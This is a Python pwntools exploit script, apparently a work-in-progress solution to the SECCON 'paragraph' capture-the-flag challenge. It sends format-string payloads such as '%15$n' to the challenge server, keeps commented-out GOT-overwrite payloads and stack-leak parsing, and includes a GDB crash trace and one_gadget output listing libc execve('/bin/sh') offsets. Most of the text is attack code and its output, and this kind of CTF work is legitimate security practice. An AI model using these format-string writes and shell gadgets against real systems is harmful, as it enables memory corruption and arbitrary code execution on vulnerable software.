from pwn import *
import time

# split horizontally
context.terminal = ["tmux", "splitw", "-h"]


def connect(exe, host, port):
    context.binary = exe.path
    if args.GDB:
        gdbscript = """"""
            break *main
            break *main+107
            continue
        """
        return gdb.debug(exe.path, gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process(exe.path)


exe = ELF("chall")
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# libc = ELF("libc.so.6")

offset = 8
# io.sendline(b'%6$p-%10$p-%11$p-%12$p')
# io.sendline(b'%6$p-%13$p-%15$p-')

# payload = fmtstr_payload(offset, {exe.got['printf'] + 16: 0xbfd9}, write_size='short')
# payload = fmtstr_payload(offset, {exe.got['printf'] + 16: 0xd9}, write_size='byte')
# payload = fmtstr_payload(offset, {0x404000: 0xd9}, write_size='byte')
# payload = fmtstr_payload(offset, {0x4040a0: 0})
# payload = b'AAA-%6$p-%7$p-%8$p-'
payload = b'AAA-%15$n'
# print(len(payload))
# print(payload)
# payload = b'%49113c%8$hnaaaa,@@\x00\x00\x00\x00\x00'
# payload = b'%49113c%8$hnaaaa(@@\x00\x00\x00\x00\x00'
# io.recvuntil(b'asked.\n')
# main, leak, _ = io.recvline().split(b'-')[1:]
# main = int(main, 16)
# ret = int(leak, 16) - 0x7ffd36ef8808 + 0x7ffd36ef8708

# log.info(f"main: {hex(main)}")
# log.info(f"ret: {hex(ret)}")

for _ in range(1):
    io = connect(exe, "paragraph.seccon.games", 5000)
    io.sendlineafter(b'asked.', payload)
    # io.sendline(b'cat /flag*')
    # io.interactive()
    res = io.recvall()
    if b'SECCON' in res:
        print(res)
        break
    io.close()
    time.sleep(0.5)

"""
Program received signal SIGSEGV, Segmentation fault.
0x00007a9e7747d5bf in printf_positional (s=s@entry=0x7ffec4ae4110, format=format@entry=0x7ffec4ae6330 "%8$n", readonly_format=readonly_format@entry=0, ap=ap@entry=0x7ffec4ae6250, ap_savep=ap_savep@entry=0x7ffec4ae3c98, done=<optimized out>, done@entry=0, nspecs_done=<optimized out>, lead_str_end=<optimized out>, work_buffer=<optimized out>, save_errno=<optimized out>, grouping=<optimized out>, thousands_sep=<optimized out>, mode_flags=<optimized out>) at ./stdio-common/vfprintf-internal.c:1926
1926    ./stdio-common/vfprintf-internal.c: No such file or directory.
"""

"""
0xebc81 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL || r10 is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebc85 execve("/bin/sh", r10, rdx)
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL || r10 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xebc88 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xebce2 execve("/bin/sh", rbp-0x50, r12)
constraints:
  address rbp-0x48 is writable
  r13 == NULL || {"/bin/sh", r13, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xebd38 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  r12 == NULL || {"/bin/sh", r12, NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebd3f execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  rax == NULL || {rax, r12, NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebd43 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x50 is writable
  rax == NULL || {rax, [rbp-0x48], NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp
"""